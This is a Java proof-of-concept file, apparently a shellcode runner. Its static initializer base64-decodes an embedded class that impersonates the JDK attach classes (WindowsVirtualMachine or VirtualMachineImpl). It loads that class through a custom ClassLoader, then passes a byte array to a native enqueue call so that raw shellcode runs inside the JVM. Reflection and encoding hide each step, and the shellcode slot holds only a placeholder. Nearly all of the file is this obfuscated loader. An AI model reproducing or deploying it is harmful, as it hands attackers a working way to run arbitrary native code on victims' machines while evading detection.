import java.lang.reflect.Method;


public class Poc extends ClassLoader{
    public Class get(byte[] bytes){
        return super.defineClass(bytes, 0, bytes.length);
    }




    static {
        Class base64;
        byte[] bytes1 = new byte[0];
        byte[] bytes2 = new byte[0];
        String code0="yv66vgAAADEAJgoABwAZCAAaCgAbABwF//////////8IAB0HAB4KAAkAHwcAIAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdlbnF1ZXVlAQA9KEpbQkxqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspVgEACkV4Y2VwdGlvbnMHACEBAAtvcGVuUHJvY2VzcwEABChJKUoBAANydW4BAAUoW0IpVgcAIgEAClNvdXJjZUZpbGUBABpXaW5kb3dzVmlydHVhbE1hY2hpbmUuamF2YQwACgALAQAGYXR0YWNoBwAjDAAkACUBAAlzaGVsbGNvZGUBABBqYXZhL2xhbmcvT2JqZWN0DAAOAA8BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACQAHAAAAAAAEAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAABgGIAA4ADwABABAAAAAEAAEAEQEIABIAEwABABAAAAAEAAEAEQAJABQAFQACAAwAAAA1AAYAAQAAABUSArgAAxQABCoSBhIGA70AB7gACLEAAAABAA0AAAAOAAMAAAAMAAUADgAUAA8AEAAAAAQAAQAWAAEAFwAAAAIAGA==";
        String code1 = "yv66vgAAADEAJAoABwAYCAAZCgAaABsF//////////8IABwHAB0KAAkAHgcAHwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdlbnF1ZXVlAQA9KEpbQkxqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspVgEACkV4Y2VwdGlvbnMHACABAAtvcGVuUHJvY2VzcwEABChJKUoBAANydW4BAAUoW0IpVgEAClNvdXJjZUZpbGUBABdWaXJ0dWFsTWFjaGluZUltcGwuamF2YQwACgALAQAGYXR0YWNoBwAhDAAiACMBAAlzaGVsbGNvZGUBABBqYXZhL2xhbmcvT2JqZWN0DAAOAA8BACNzdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lSW1wbAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAJAAcAAAAAAAQAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAAFAYgADgAPAAEAEAAAAAQAAQARAQgAEgATAAEAEAAAAAQAAQARAAkAFAAVAAIADAAAADUABgABAAAAFRICuAADFAAEKhIGEgYDvQAHuAAIsQAAAAEADQAAAA4AAwAAAAsABQAOABQADwAQAAAABAABABEAAQAWAAAAAgAX";
        String code2 = "AAAAAAAAA";
        if (System.getProperty("java.version").contains("1.8.")){
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                bytes1 = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{code0});
                bytes2 = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{code2});
                Class c = new Poc().get(bytes1);
                System.out.println(c.getName());
                Method m = c.getMethod("run", byte[].class);
                m.invoke(c,bytes2);
            }catch (Exception e){
                e.printStackTrace();
            }
        }else {
            try {
                base64 = Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                bytes1 = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{code1});
                bytes2 = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{code2});
                Class c = new Poc().get(bytes1);
                Method m = c.getMethod("run", byte[].class);
                m.invoke(c, bytes2);
            } catch (Exception e1) {
                System.out.println(e1);
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    bytes1 = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{code1});
                    bytes2 = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{code2});
                    Class c = new Poc().get(bytes1);
                    Method m = c.getMethod("run", byte[].class);
                    m.invoke(c, bytes2);
                }catch (Exception e){
                    System.out.println(e);
                }
            }
        }
    }


    public static void main(String[] args) {


    }
}